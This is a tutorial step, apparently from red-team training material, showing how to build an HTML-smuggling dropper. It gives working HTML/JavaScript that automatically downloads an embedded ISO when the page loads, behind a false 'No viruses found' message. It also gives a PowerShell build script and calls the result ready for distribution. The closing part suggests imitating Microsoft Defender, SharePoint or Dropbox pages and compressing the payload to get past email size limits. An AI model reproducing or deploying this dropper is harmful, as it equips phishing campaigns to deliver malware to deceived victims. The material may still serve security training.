---
title: "Step 3: Assemble the HTML"
---

<h1>Step 3: Assemble the HTML</h1>

## HTML Dropper Design

With the ISO in-hand, we can begin constructing the HTML dropper. When opened, our HTML dropper will trigger the browser to "download" the ISO. We'll accomplish this using some clever JavaScript embedded in the HTML. For added measure, we'll make the HTML look as if it's performing a safety check on the file before initiating the download.

## Create the HTML Template

Rather than put everything together by hand, we'll create a base HTML template, along with a PowerShell script that will inject the `document_archive.iso` file into the template. This way, we can easily replace the ISO without having to re-write the HTML file by hand. Here's our basic template:

```html
<!DOCTYPE html>
<html>
    <head>
        <script>
            const filename = "document_archive.iso";
            const contentBase64 = (
                "ISO_GOES_HERE"
            );
            function triggerDownload() {
                var element = document.createElement("a");
                element.setAttribute("href", `data:application/octet-stream;base64,${contentBase64}`);
                element.setAttribute("target", "_self");
                element.setAttribute("download", filename);
                element.style.display = "none";
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
            }
        </script>
    </head>
    <body onload="triggerDownload()">
        <b>Scan complete! No viruses found. Downloading document archive...</b>
    </body>
</html>
```

Save this file as `html_template.htm`, in the `PoC Dropper` directory.

Our template is obviously not going to win any HTML design awards, but it'll suffice. When the HTML file finishes loading, the `triggerDownload` JavaScript function gets called. The function creates an invisible hyperlink, configures it to save the ISO file (embedded in the `contentBase64` variable), then automatically clicks the link. Once clicked, the JavaScript automatically removes the hyperlink from the page. For extra credibility, we've added a message to the body of the HTML which claims that the file was scanned before the download commenced.

## Automate the HTML Build

In order to complete the HTML dropper, we'll need to replace the `ISO_GOES_HERE` block with the Base64-encoded ISO file. We can do this with PowerShell. Create a new PowerShell script called `build_html.ps1`, in the `PoC Dropper` directory, with the following contents:

```sh
# Read HTML from `html_template.htm`.
$html = Get-Content -path "html_template.htm";

# Base64-encode the ISO.
$encodedIso = [convert]::ToBase64String((Get-Content -path "document_archive.iso" -Encoding byte));
$splitLines = $encodedIso -split "(.{78})" | ? {$_};
$encodedLines = $splitLines -join "`"`n                `"";

# Replace the placeholder with the Base64-encoded ISO.
$html = $html -replace "ISO_GOES_HERE", $encodedLines;

# Write the HTML to `output.htm`.
$html | Out-File -FilePath "output.htm" -Encoding ascii;
```

## Build the HTML

With our script complete, we can execute the `build_html.ps1` script, which will produce the `output.htm` file. The `output.htm` will look something like this:

```javascript
// [...]
const filename = "document_archive.iso";
const contentBase64 = (
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    // [...]
);
function triggerDownload() {
    var element = document.createElement("a");
    element.setAttribute("href", `data:application/octet-stream;base64,${contentBase64}`);
    element.setAttribute("target", "_self");
// [...]
```

Don't worry if it looks like the Base64 file is all `A`s; this is common for the filetype. Having confirmed the `output.htm` file was successfully written, we can rename it to `document.htm`, and it's ready for distribution!

# Improving the Design

Our HTML dropper is complete, but there are plenty of ways it could be improved. For one, we could use stylesheets and JavaScript to create a more convincing page. If the target has some form of link protection (such as the one provided by Microsoft Defender 365), the HTML could be crafted to mimic its look and feel, so that it blends in with what the target is used to seeing. Some attackers tailor the HTML to appear as a file-sharing portal, like SharePoint or DropBox, lending similar credibility.

Another pinch-point is the size of the `document.htm` file. While the contents of the ISO file are only a few kilobytes large, the ISO file itself can be a few megabytes in size. With our simple PoC stager, this isn't much of an issue, but bundling a larger stager could be a problem, as emails often have a limit on maximum attachment size. To account for this, one could use `gzip` compression to shrink the ISO, resulting in a much smaller file. However, this would require the JavaScript to decompress the ISO in-memory prior to triggering the download.

We will leave these improvements as a challenge for the reader.